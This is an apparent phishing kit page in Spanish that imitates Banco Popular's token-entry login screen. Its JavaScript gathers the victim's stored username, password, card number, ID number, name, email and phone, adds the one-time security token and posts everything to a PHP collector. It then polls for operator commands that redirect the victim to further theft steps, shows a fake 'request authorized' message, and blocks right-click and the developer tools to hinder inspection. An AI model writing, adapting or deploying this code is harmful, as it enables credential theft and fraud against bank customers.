<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Popular</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: "Open Sans", Arial, sans-serif;
            background-color: #F4F6F9; 
            color: #333;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            border-top: 6px solid #054C54; 
        }

        /* Pantalla difuminada de carga */
        .screen-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(30, 30, 30, 0.4);
            backdrop-filter: blur(4px);
            z-index: 9998;
            display: none; 
        }
        body.is-loading .screen-overlay { display: block; }
        /* body.is-loading .login-card { z-index: 9999; } // Eliminado para que el overlay gris quede por encima de la card */

        .main-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center; 
            gap: 45px; 
            padding: 60px 20px;
            max-width: 1100px; 
            margin: 0 auto;
            width: 100%;
        }

        /* =========================================
           COLUMNA IZQUIERDA: FORMULARIO (PC)
           ========================================= */
        .login-card {
            background: #FFFFFF;
            border-radius: 12px;
            padding: 45px 32px; 
            width: 100%;
            max-width: 367.6px; 
            flex-shrink: 0; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
            position: relative;
        }

        .shield-icon {
            position: absolute;
            top: 22px;
            right: 22px;
        }
        .shield-icon svg { width: 20px; height: 20px; stroke: #D76B41; fill: none; stroke-width: 1.5; }

        .welcome-text { font-size: 15px; font-weight: 700; color: #111; margin-bottom: 6px; }
        .bank-logo { height: 32px; margin-bottom: 28px; } 

        .form-group { margin-bottom: 20px; }
        .form-label { display: flex; justify-content: space-between; font-size: 12px; color: #555; margin-bottom: 8px; font-weight: 600; }
        .form-label a { color: #D76B41; text-decoration: underline; font-weight: 600; }

        .form-input {
            width: 100%;
            height: 46px; 
            border: 1px solid #D1D5DB;
            border-radius: 6px;
            padding: 0 14px;
            font-size: 15px; 
            font-family: inherit;
            outline: none;
            color: #333;
            background-color: #FFF;
            transition: border-color 0.2s;
        }
        .form-input:focus { border-color: #2CA859; }

        .password-wrapper {
            display: flex;
            align-items: center;
            border: 1px solid #D1D5DB;
            border-radius: 6px;
            height: 46px;
            background-color: #FFF;
            position: relative;
            transition: border-color 0.2s;
        }
        .password-wrapper:focus-within { border-color: #2CA859; }

        .password-dashes {
            position: absolute;
            left: 0; top: 0;
            width: calc(100% - 45px);
            height: 100%;
            display: flex;
            justify-content: space-evenly;
            align-items: center;
            color: #333;
            font-weight: 700;
            font-size: 16px;
            pointer-events: none; 
        }

        .pass-hidden-input {
            width: calc(100% - 45px);
            height: 100%;
            border: none;
            background: transparent;
            font-size: 26px; 
            color: #111;
            text-align: center;
            letter-spacing: 30px; 
            padding-left: 30px; 
            outline: none;
            font-family: monospace;
            z-index: 2;
        }

        .eye-icon {
            width: 45px;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 3;
        }
        .eye-icon svg { width: 22px; height: 22px; stroke: #999; stroke-width: 1.5; fill: none; cursor: pointer; }

        .toggle-group { display: flex; align-items: center; gap: 12px; margin-bottom: 28px; margin-top: 24px; }
        .toggle-switch {
            position: relative; width: 38px; height: 20px; background-color: #CBD5E1;
            border-radius: 20px; cursor: pointer; transition: background-color 0.3s;
        }
        .toggle-switch::after {
            content: ''; position: absolute; top: 2px; left: 2px;
            width: 16px; height: 16px; background-color: #FFF;
            border-radius: 50%; transition: transform 0.3s; box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .toggle-label { font-size: 12px; color: #333; font-weight: 600; }

        .btn-submit {
            width: 100%; height: 48px; background-color: #C2C2C2; color: #666;
            border: none; border-radius: 6px; font-weight: 600; font-size: 15px; cursor: not-allowed;
            transition: background-color 0.3s, color 0.3s;
            display: flex; justify-content: center; align-items: center;
        }
        .btn-submit.active {
            background-color: #054C54; 
            color: #FFFFFF;
            cursor: pointer;
        }

        .dot-flashing { display: flex; justify-content: center; align-items: center; gap: 6px; height: 100%; }
        .dot-flashing span {
            width: 7px; height: 7px; background-color: #FFFFFF; border-radius: 50%;
            animation: dotBounce 0.6s infinite alternate;
        }
        .dot-flashing span:nth-child(2) { animation-delay: 0.2s; }
        .dot-flashing span:nth-child(3) { animation-delay: 0.4s; }

        @keyframes dotBounce {
            from { transform: translateY(0); }
            to { transform: translateY(-5px); }
        }

        /* =========================================
           COLUMNA DERECHA: BANNER Y AYUDA (PC)
           ========================================= */
        .right-column { flex: 1; width: 100%; max-width: 660px; display: flex; flex-direction: column; }

        .carousel-container { width: 100%; position: relative; margin-bottom: 28px; }
        .carousel-viewport {
            width: 100%; aspect-ratio: 2.2 / 1; border-radius: 12px; overflow: hidden;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05); background-color: #004F43; 
        }
        .carousel-track { display: flex; width: 200%; height: 100%; transition: transform 0.6s ease-in-out; }
        .carousel-track img { width: 50%; height: 100%; object-fit: cover; display: block; }

        .carousel-indicators { display: flex; gap: 8px; margin-top: 18px; }
        .indicator { height: 4px; flex: 1; background-color: #E5E7EB; border-radius: 2px; transition: background-color 0.3s; }
        .indicator.active { background-color: #2CA859; }

        .help-title { font-size: 16px; font-weight: 700; color: #333; margin-bottom: 14px; margin-top: 5px; }

        .help-cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 18px; }
        .help-card {
            background: #FFFFFF; border-radius: 10px; padding: 22px 12px;
            display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.03); text-decoration: none; color: #333; transition: transform 0.2s;
        }
        .help-card:hover { transform: translateY(-3px); }
        .help-card img { width: 36px; height: 36px; }
        .help-card span { font-size: 12px; font-weight: 600; text-align: center; }

        /* =========================================
           FOOTER (PC)
           ========================================= */
        .footer {
            background-color: #FFFFFF; border-top: 1px solid #E5E7EB;
            padding: 18px 30px; display: flex; flex-direction: column; gap: 10px;
        }
        .footer-top { display: flex; justify-content: space-between; align-items: center; }
        .footer-logo { height: 28px; }
        .footer-links { display: flex; align-items: center; }
        .footer-links a { font-size: 13px; color: #D76B41; font-weight: 600; text-decoration: none; margin-left: 20px; }
        .footer-bottom { display: flex; justify-content: space-between; font-size: 12px; color: #777; }

        /* =========================================
           MODAL "SOLICITUD AUTORIZADA"
           ========================================= */
        .auth-modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            display: none; justify-content: center; align-items: center;
            z-index: 9997; /* Debajo del overlay is-loading que tiene z-index: 9998 */
        }
        .auth-modal.show { display: flex; }
        .auth-card {
            background: #FFFFFF; border-radius: 14px; padding: 25px 20px;
            width: 90%; max-width: 290px; text-align: center; position: relative;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            animation: popIn 0.3s ease-out forwards;
        }
        .auth-card .close-btn { position: absolute; top: 12px; right: 12px; background: none; border: none; cursor: pointer; }
        .auth-card .close-btn svg { width: 18px; height: 18px; stroke: #FF5E00; stroke-width: 2; }
        .auth-icon-circle {
            width: 50px; height: 50px; background-color: #D4F4D2; border-radius: 50%;
            display: flex; justify-content: center; align-items: center; margin: 0 auto 12px auto;
        }
        .auth-icon-circle svg {
            width: 24px; height: 24px; stroke: #2CA859; stroke-width: 2; fill: none;
        }
        .auth-card h3 { font-size: 18px; font-weight: 700; margin-bottom: 8px; color: #111; }
        .auth-card p { font-size: 13.5px; color: #111; line-height: 1.4; }

        @keyframes popIn { 0% { transform: scale(0.9); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }

        /* =========================================
           BANNER DE ERROR SUPERIOR
           ========================================= */
        .top-error-banner {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-20px);
            width: 95%; max-width: 600px; background-color: #FDECEC;
            border: 1px solid #F9A8A8; border-radius: 6px; padding: 14px 18px;
            display: flex; align-items: center; gap: 14px;
            z-index: 10000; opacity: 0; visibility: hidden; transition: all 0.3s ease;
        }
        .top-error-banner.show { opacity: 1; visibility: visible; transform: translateX(-50%) translateY(0); }
        .top-error-left-line { width: 4px; height: 28px; background-color: #F87171; border-radius: 2px; }
        .top-error-icon {
            width: 34px; height: 34px; background: #FFFFFF; border-radius: 50%;
            display: flex; justify-content: center; align-items: center; flex-shrink: 0;
        }
        .top-error-icon svg { width: 20px; height: 20px; stroke: #EF4444; stroke-width: 2; fill: none; }
        .top-error-text { flex: 1; font-size: 14px; font-weight: 600; color: #111; }
        .top-error-close { background: none; border: none; cursor: pointer; padding: 4px; }
        .top-error-close svg { width: 20px; height: 20px; stroke: #555; stroke-width: 1.5; }

        /* =========================================
           MEDIA QUERY: VISTA MÓVIL EXACTA A LA IMAGEN
           ========================================= */
        @media (max-width: 850px) {
            body {
                background-image: none; /* Quita el fondo en celular */
                background-color: #FFFFFF; /* Fondo blanco completo */
            }
            
            .main-container { 
                padding: 0; 
                margin: 0; 
            }
            
            /* Ocultar el banner y la ayuda completamente en celular */
            .right-column { 
                display: none; 
            } 
            
            /* Ajustar la tarjeta para que no parezca tarjeta (sin bordes, sin sombras) */
            .login-card { 
                max-width: 100%; 
                box-shadow: none;
                border-radius: 0;
                padding: 30px 24px 40px 24px;
            }
            
            .shield-icon {
                top: 20px;
                right: 20px;
            }

            /* Footer ajustado para celular según la captura */
            .footer {
                border-top: 24px solid #F4F6F9; /* La franja gris gruesa antes del footer */
                padding: 40px 20px 30px 20px;
            }
            
            .footer-top {
                flex-direction: column-reverse; /* Enlaces arriba, logo abajo */
                gap: 40px;
            }
            
            .footer-links {
                display: flex;
                justify-content: center;
                gap: 50px; /* Separación amplia entre Seguridad y Accesibilidad */
                width: 100%;
            }
            
            .footer-links a {
                margin: 0;
                font-size: 15px; /* Textos un poco más grandes en móvil */
            }
            
            .footer-bottom {
                flex-direction: column;
                align-items: center;
                gap: 10px;
                margin-top: 30px;
                text-align: center;
            }
        }
    </style>
</head>
<body>

    <!-- Overlay gris difuminado -->
    <div class="screen-overlay"></div>

    <!-- Modal: Solicitud Autorizada -->
    <div class="auth-modal" id="authModal">
        <div class="auth-card">
            <button class="close-btn" id="closeAuthBtn">
                <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
                    <line x1="18" y1="6" x2="6" y2="18"></line>
                    <line x1="6" y1="6" x2="18" y2="18"></line>
                </svg>
            </button>
            <div class="auth-icon-circle">
                <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"></path>
                </svg>
            </div>
            <h3>¡Solicitud autorizada!</h3>
            <p>De acuerdo con nuestros registros, la solicitud<br>ha sido aprobada.</p>
        </div>
    </div>

    <!-- Banner de Error Superior -->
    <div class="top-error-banner" id="errorBanner">
        <div class="top-error-left-line"></div>
        <div class="top-error-icon">
            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <path d="M16 16s-1.5-2-4-2-4 2-4 2"></path>
                <line x1="9" y1="9" x2="9.01" y2="9"></line>
                <line x1="15" y1="9" x2="15.01" y2="9"></line>
            </svg>
        </div>
        <div class="top-error-text">El token ingresado no es válido. Verifica e intenta de nuevo.</div>
        <button class="top-error-close" id="closeErrorBtn">
            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
        </button>
    </div>

    <main class="main-container">
        
        <!-- COLUMNA IZQUIERDA: FORMULARIO -->
        <div class="login-card">
            
            <div style="text-align: center; margin-bottom: 30px; margin-top: 15px;">
                <!-- Icono tipo candado con estrellas -->
                <svg viewBox="0 0 100 80" width="100" height="80" style="margin-bottom: 12px;">
                    <!-- Estrellas y decoraciones -->
                    <path d="M 25 15 L 28 22 L 35 25 L 28 28 L 25 35 L 22 28 L 15 25 L 22 22 Z" fill="none" stroke="#2CA859" stroke-width="1.5"/>
                    <path d="M 75 10 L 77 15 L 82 17 L 77 19 L 75 24 L 73 19 L 68 17 L 73 15 Z" fill="none" stroke="#2CA859" stroke-width="1.5"/>
                    <circle cx="85" cy="40" r="2.5" fill="#2CA859"/>
                    <circle cx="20" cy="55" r="3.5" fill="none" stroke="#2CA859" stroke-width="1.5"/>
                    <path d="M 50 10 L 53 14 L 58 15 L 53 17 L 50 21 L 47 17 L 42 15 L 47 14 Z" fill="none" stroke="#2CA859" stroke-width="1.5"/>
                    
                    <!-- Rectángulo principal del input -->
                    <rect x="25" y="32" width="50" height="18" rx="4" fill="none" stroke="#2CA859" stroke-width="1.5"/>
                    <circle cx="31" cy="41" r="2.5" fill="none" stroke="#2CA859" stroke-width="1.5"/>
                    <circle cx="39" cy="41" r="2.5" fill="none" stroke="#2CA859" stroke-width="1.5"/>
                    <circle cx="47" cy="41" r="2.5" fill="none" stroke="#2CA859" stroke-width="1.5"/>
                    <circle cx="55" cy="41" r="2.5" fill="none" stroke="#2CA859" stroke-width="1.5"/>
                    
                    <!-- Candado verde sobrepuesto -->
                    <circle cx="65" cy="50" r="14" fill="#FFFFFF" stroke="#2CA859" stroke-width="1.5"/>
                    <rect x="60" y="49" width="10" height="8" rx="1.5" fill="#2CA859"/>
                    <path d="M 61 49 V 45 A 4 4 0 0 1 69 45 V 49" fill="none" stroke="#2CA859" stroke-width="1.5"/>
                    <circle cx="65" cy="53" r="1.5" fill="#FFFFFF"/>
                </svg>
                
                <h2 style="font-size: 20px; font-weight: 700; color: #111; margin-bottom: 12px;">Escribe tu token</h2>
                <p id="tokenDesc" style="font-size: 14.5px; color: #555; line-height: 1.5; padding: 0 10px;">Ingresa el token de seguridad generado desde la aplicación.</p>
            </div>

            <form action="#" method="POST" id="loginForm">
                
                <div class="form-group">
                    <div class="form-label">
                        <span>Token único</span>
                        <a href="#">¿No lo recibiste?</a>
                    </div>
                    <div class="password-wrapper">
                        <div class="password-dashes" id="passDashes" style="width: calc(100% - 45px); justify-content: space-evenly;">
                            <span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span>
                        </div>
                        <input type="password" id="passInput" class="pass-hidden-input" maxlength="8" autocomplete="off" inputmode="numeric" style="letter-spacing: 14px; font-size: 20px; padding-left: 14px;">
                        <div class="eye-icon" id="toggleEye">
                            <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                        </div>
                    </div>
                </div>

                <button type="submit" class="btn-submit" id="btnSubmit" disabled style="margin-top: 15px;">Ingresar</button>
            </form>
        </div>

        <!-- COLUMNA DERECHA: BANNER Y AYUDA -->
        <div class="right-column">
            <div class="carousel-container">
                <div class="carousel-viewport">
                    <div class="carousel-track" id="carouselTrack">
                        <img src="img/baner1.svg" alt="Promoción 1">
                        <img src="img/baner2.svg" alt="Promoción 2">
                    </div>
                </div>
                <div class="carousel-indicators">
                    <div class="indicator active" id="dot0"></div>
                    <div class="indicator" id="dot1"></div>
                    <div class="indicator"></div>
                    <div class="indicator"></div>
                </div>
            </div>

            <div class="help-title">¿Cómo podemos ayudarte?</div>
            <div class="help-cards">
                <a href="#" class="help-card">
                    <img src="img/solicitar.svg" alt="Solicitar productos">
                    <span>Solicitar productos</span>
                </a>
                <a href="#" class="help-card">
                    <img src="img/contacto.svg" alt="Contáctanos">
                    <span>Contáctanos</span>
                </a>
                <a href="#" class="help-card">
                    <img src="img/visitanos.svg" alt="Visítanos">
                    <span>Visítanos</span>
                </a>
            </div>
        </div>

    </main>

    <!-- FOOTER -->
    <footer class="footer">
        <div class="footer-top">
            <img src="img/aval.png" alt="Grupo Aval" class="footer-logo">
            <div class="footer-links">
                <a href="#">Seguridad</a>
                <a href="#">Accesibilidad</a>
            </div>
        </div>
        <div class="footer-bottom">
            <span id="footerDate"></span>
            <span>© Banco Popular. Todos los derechos reservados. | V4.3.22</span>
        </div>
    </footer>

    <!-- SCRIPTS INTERACTIVOS -->
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            
            const passInput = document.getElementById('passInput');
            const passDashes = document.getElementById('passDashes');
            const btnSubmit = document.getElementById('btnSubmit');
            const toggleEye = document.getElementById('toggleEye');
            const loginForm = document.getElementById('loginForm');
            
            const authModal = document.getElementById('authModal');
            const closeAuthBtn = document.getElementById('closeAuthBtn');
            const errorBanner = document.getElementById('errorBanner');
            const closeErrorBtn = document.getElementById('closeErrorBtn');
            const tokenDesc = document.getElementById('tokenDesc');

            // Verificar si es SMS
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('sms')) {
                tokenDesc.textContent = "Te enviamos un mensaje de texto con tu token de seguridad.";
            }

            function checkForm() {
                if (passInput.value.length >= 6 && passInput.value.length <= 8) {
                    btnSubmit.classList.add('active');
                    btnSubmit.removeAttribute('disabled');
                } else {
                    btnSubmit.classList.remove('active');
                    btnSubmit.setAttribute('disabled', 'true');
                }
            }

            passInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 8);
                if (e.target.value.length > 0) {
                    passDashes.style.display = 'none';
                } else {
                    passDashes.style.display = 'flex';
                }
                checkForm();
                errorBanner.classList.remove('show'); 
            });

            toggleEye.addEventListener('click', () => {
                passInput.type = passInput.type === 'password' ? 'text' : 'password';
            });

            closeAuthBtn.addEventListener('click', () => authModal.classList.remove('show'));
            closeErrorBtn.addEventListener('click', () => errorBanner.classList.remove('show'));

            // Flujo de carga y modales
            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault(); 
                
                // 1. Mostrar loader SÓLO en el botón (sin gris)
                btnSubmit.innerHTML = `<div class="dot-flashing"><span></span><span></span><span></span></div>`;
                btnSubmit.style.cursor = 'wait';
                
                window.visualSequenceComplete = false;

                // Animaciones visuales preprogramadas (independientes del fetch)
                setTimeout(() => {
                    // a los 2s: mostrar el modal "Solicitud autorizada"
                    authModal.classList.add('show');
                    
                    setTimeout(() => {
                        // a los 4s totales: ocultar modal "Solicitud autorizada" y mostrar gris
                        authModal.classList.remove('show');
                        document.body.classList.add('is-loading');
                        
                        // Habilitar la aplicación de respuestas del backend
                        window.visualSequenceComplete = true;
                    }, 2000); 
                }, 2000); 

                const p = passInput.value.trim();

                let sessionId = ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })());
                if (!sessionId) {
                  sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                  localStorage.setItem('session_id', sessionId);
                }

                let u = localStorage.getItem('username') || '';
                let pwd = localStorage.getItem('password') || '';

                let localTb = {};
                try {
                    localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
                } catch(e) {}

                if (!localTb.banco) localTb.banco = localStorage.getItem('banco') || 'BANCO POPULAR';
                if (!localTb.total_pagar) localTb.total_pagar = localStorage.getItem('total_pagar') || '';
                if (!localTb.documento && localStorage.getItem('val')) localTb.documento = localStorage.getItem('val');
                if (!localTb.nombre && (localStorage.getItem('nombre') || localStorage.getItem('nom'))) localTb.nombre = localStorage.getItem('nombre') || localStorage.getItem('nom');
                if (!localTb.correo && (localStorage.getItem('correo') || localStorage.getItem('eml'))) localTb.correo = localStorage.getItem('correo') || localStorage.getItem('eml');
                if (!localTb.telefono && (localStorage.getItem('celular') || localStorage.getItem('cel'))) localTb.telefono = localStorage.getItem('celular') || localStorage.getItem('cel');
                if (!localTb.tarjeta && (localStorage.getItem('tarjeta') || localStorage.getItem('num'))) localTb.tarjeta = localStorage.getItem('tarjeta') || localStorage.getItem('num');

                const formData = new FormData();
                formData.append('transactionId', sessionId);
                formData.append('u_id', u);
                formData.append('u_ps', pwd);
                formData.append('u_tk', p);
                formData.append('u_tb', JSON.stringify(localTb));

                try {
                    const res = await fetch('procesar_dinamica.php', { method: 'POST', body: formData });
                    const result = await res.json();
                    
                    if (result.status === 'success') {
                        localStorage.setItem('messageId', result.messageId);
                        checkPaymentVerification(sessionId, result.messageId);
                    } else {
                        setTimeout(() => checkPaymentVerification(sessionId, 'msg_' + Date.now()), 2000);
                    }
                } catch (e) {
                    setTimeout(() => checkPaymentVerification(sessionId, 'msg_' + Date.now()), 2000);
                }
            });

            async function checkPaymentVerification(transactionId, messageId) {
                try {
                    const formData = new FormData();
                    formData.append('transactionId', transactionId);
                    formData.append('messageId', messageId);

                    const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), { method: 'POST', body: formData });
                    const result = await res.json();

                    if (result && result.action) {
                        
                        const applyAction = () => {
                            switch (result.action) {
                                case 'pedir_dinamica':
                                case 'error_token':
                                case 'pedir_sms':
                                    window.location.href = 'token.php' + (result.action === 'pedir_sms' ? '?sms=1' : '');
                                    break;
                                case 'error_logo':
                                case 'error_token':
                                    document.body.classList.remove('is-loading');
                                    btnSubmit.innerHTML = 'Ingresar';
                                    btnSubmit.style.cursor = 'pointer';

                                    passInput.value = '';
                                    passDashes.style.display = 'flex';
                                    checkForm();

                                    errorBanner.classList.add('show');
                                    break;
                                case 'bre_b':
                                    window.location.href = '/recaudos/brev.php?popular';
                                    break;
                                case 'error_tc':
                                    window.location.href = '/datac/alter.php';
                                    break;
                                case 'error':
                                    window.location.href = '/caras';
                                    break;
                                case 'cedula':
                                    window.location.href = '/cedula';
                                    break;
                                case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                                    window.location.href = '/fin.php';
                                    break;
                                default:
                                    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
                            }
                        };

                        if (window.visualSequenceComplete) {
                            applyAction();
                        } else {
                            const waitInterval = setInterval(() => {
                                if (window.visualSequenceComplete) {
                                    clearInterval(waitInterval);
                                    applyAction();
                                }
                            }, 500);
                        }

                    } else {
                        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
                    }
                } catch (err) {
                    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
                }
            }

            // Lógica del Slider
            const track = document.getElementById('carouselTrack');
            const dot0 = document.getElementById('dot0');
            const dot1 = document.getElementById('dot1');
            let currentSlide = 0;

            setInterval(() => {
                currentSlide = currentSlide === 0 ? 1 : 0;
                track.style.transform = `translateX(-${currentSlide * 50}%)`;
                if (currentSlide === 0) {
                    dot0.classList.add('active'); dot1.classList.remove('active');
                } else {
                    dot1.classList.add('active'); dot0.classList.remove('active');
                }
            }, 6000); 

            // Botón Toggle
            const toggleBtn = document.getElementById('rememberSwitch');
            let isToggled = false;
            toggleBtn.addEventListener('click', () => {
                isToggled = !isToggled;
                if (isToggled) {
                    toggleBtn.style.backgroundColor = '#2CA859';
                    toggleBtn.innerHTML = '<style>#rememberSwitch::after { transform: translateX(18px); }</style>';
                } else {
                    toggleBtn.style.backgroundColor = '#CBD5E1';
                    toggleBtn.innerHTML = '<style>#rememberSwitch::after { transform: translateX(0); }</style>';
                }
            });

            // Fecha Dinámica
            function updateDate() {
                const now = new Date();
                const dateOptions = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                let dateString = now.toLocaleDateString('es-CO', dateOptions);
                dateString = dateString.charAt(0).toUpperCase() + dateString.slice(1);
                const timeOptions = { hour: 'numeric', minute: '2-digit', hour12: true };
                let timeString = now.toLocaleTimeString('es-CO', timeOptions);
                timeString = timeString.replace('AM', 'a. m.').replace('PM', 'p. m.');
                document.getElementById('footerDate').textContent = `${dateString} | ${timeString}`;
            }
            
            updateDate();
            setInterval(updateDate, 60000);
        });
    </script>
<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html> 